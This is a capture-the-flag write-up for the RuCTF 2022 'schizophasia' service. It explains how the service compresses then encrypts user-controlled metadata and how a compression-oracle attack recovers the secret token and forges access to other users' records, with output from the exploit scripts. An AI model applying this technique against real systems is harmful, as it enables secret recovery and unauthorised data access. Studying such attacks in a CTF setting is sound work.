### RuCTF 2022 | schizophasia

# Description

Service forwards your question to a doctor who can easily answer any question. The only problem that it seems like the doctor speaks some nonsense.

Service consists of two parts: registry and doctor.

## Doctor (GoLang)

The doctor can answer any question. Unfortunately, the doctor doesn't want to communicate with the outside world. The only thing that doctor accepts is specially crafted messages from the registry. After reading the message, the doctor writes the response into the registry and creates a special token for the user.

## Registry (PostgreSQL)
The registry is a PostgreSQL instance with a slightly modified protocol. It uses `Y` instead of `R` to mark an authentication request message. Service can do one of the following:

1. Wrap your question into a special message that the doctor service can understand.
2. Look up the medical records and exchange the token from the doctor for the record that contains the doctor's answer to your question.

## Client
To make life easier, the service also provides the client application that performs it automatically.


# Details
Here is the sample service communication flow:

1. Client sends a query to registry:
`SELECT add_job(QUESTION, USER_ID)`, where `QUESTION` and `USER_ID` are provided by the client.

2. Registry looks up the current `TOKEN`. Registry generates a new `TOKEN` every 15 minutes. Each `TOKEN` has a lifetime of 30 minutes.

3. Registry crafts the following metadata:
```json
{ "question":"QUESTION", "token": "TOKEN", "userid": "USER_ID" }
```

4. Registry compresses the metadata using ZLIB and encrypts the compressed metadata using the  AES-256-CBC cipher.

5. Registry returns the crafted metadata:

```
postgres=# select add_job('QUESTION', 'USER_ID');
                                                                             add_job
------------------------------------------------------------------------------------------------------------------------------------------------------------------
 538ACFFF99CEAC3A62CACE164A1AFFF513A061593B06AB3DA76E101B69016CC8B689AA7251CE1135646F0E26A82908AC33626EE54BD534B08CC3FC4253A34CC2C3D6734FC2105C46B05798E46D8B1B2F
(1 row)
```

6. Also, the registry stores the following information in the database:
```
 question | userid  | status | result |    date    | token
----------+---------+--------+--------+------------+-------
 QUESTION | USER_ID | f      |        | 2022-05-22 | TOKEN
```

7. Client sends the metadata to the doctor service. The doctor computes the token as SHA1 sum of the following string "USER_ID"+"TOKEN" and returns the token to the client.

```
curl --location --request PUT 'http://127.0.0.1:18181/api/v1/jobs' \
--form 'id="538ACFFF99CEAC3A62CACE164A1AFFF513A061593B06AB3DA76E101B69016CC8B689AA7251CE1135646F0E26A82908AC33626EE54BD534B08CC3FC4253A34CC2C3D6734FC2105C46B05798E46D8B1B2F"'

{"code":200,"msg":"ok","data":"90E84150E952B3976A98CF5990629BCB5FD017BF"}
```

8. Also, the doctor updates the registry medical history entry with the answer for the provided question:

```
SELECT finish_job(TOKEN, QUESTION, USER_ID, ANSWER)
```

9. Client uses the token to format a medical history lookup request to the registry. To verify the client's request, the registry also computes the SHA1 sum of "USER_ID"+"TOKEN" and checks if it matches the provided one.

```
postgres=# SELECT * FROM medical_history('USER_ID', '90E84150E952B3976A98CF5990629BCB5FD017BF') limit 1;
     q     |    u    | s |   r
-----------+---------+---+--------
 QUESTION2 | USER_ID | t | ANSWER
(1 row)
```

# Attack

## Overview
The solution is pretty straightforward. If you look closer at steps 1-5, you can notice that the client is able to inject arbitrary data into the contents of the compressed & encrypted metadata and observe its size. It allows the attacker (client) to exploit the "compression oracle" vulnerability.

By utilizing the compression oracle attack, the client is able to read the contents of the encrypted metadata (including the TOKEN) from the registry (step 5). The client can now compute the SHA1 hash with any USER_ID (received from the check system) and pass it to the registry service to read the medical history entry.

## Example

### Token lookup

```
~/ructf-2022/sploits/schizophasia$ ./guess_token.py 127.0.0.1
current letter: A, len: 192
current letter: B, len: 192
current letter: C, len: 192
current letter: D, len: 192
current letter: E, len: 192
current letter: F, len: 192
current letter: G, len: 192
current letter: H, len: 192
current letter: I, len: 192
current letter: J, len: 192
current letter: K, len: 192
current letter: L, len: 160
current letter: M, len: 192
current letter: N, len: 192
current letter: O, len: 192
current letter: P, len: 192
current letter: Q, len: 192
current letter: R, len: 192
current letter: S, len: 192
current letter: T, len: 192
current letter: U, len: 192
current letter: V, len: 192
current letter: W, len: 192
current letter: X, len: 192
current letter: Y, len: 192
current letter: Z, len: 192
INITIAL LENGTHS: [(160, 'L')]

# on the next step, choose the entry with the smallest metadata length

current guess: LY, len: 160
current guess: LYG, len: 160
current guess: LYGU, len: 160
current guess: LYGUR, len: 160
current guess: LYGURO, len: 160
current guess: LYGUROU, len: 160
current guess: LYGUROUO, len: 160
current guess: LYGUROUOI, len: 160
current guess: LYGUROUOIF, len: 160
current guess: LYGUROUOIJ, len: 160
current guess: LYGUROUOIR, len: 160
[[[[[[[[[[('LYGUROUOIF', 160), ('LYGUROUOIJ', 160), ('LYGUROUOIR', 160)]]]]]]]]]]
```

### Get flag
```
~/ructf-2022/sploits/schizophasia$ ./get_flag.py 127.0.0.1 user_361fe807-f003-44f9-9338-2ca69c223ff4 LYGUROUOIR
SHA1('user_361fe807-f003-44f9-9338-2ca69c223ff4LYGUROUOIR'): E77BC343618D5D6E4F5B00B36CF23EED36AA6856
SELECT * FROM medical_history('user_361fe807-f003-44f9-9338-2ca69c223ff4', 'E77BC343618D5D6E4F5B00B36CF23EED36AA6856')

Question: LS0O22K9GDQW6832WXEXE7HIUXQGTSJ=
User: user_361fe807-f003-44f9-9338-2ca69c223ff4
Status: True
Answer: intelligence and machine learning can fight cyberthreats more effectively and reduce the lifecycle and impact of breaches when they occur
```

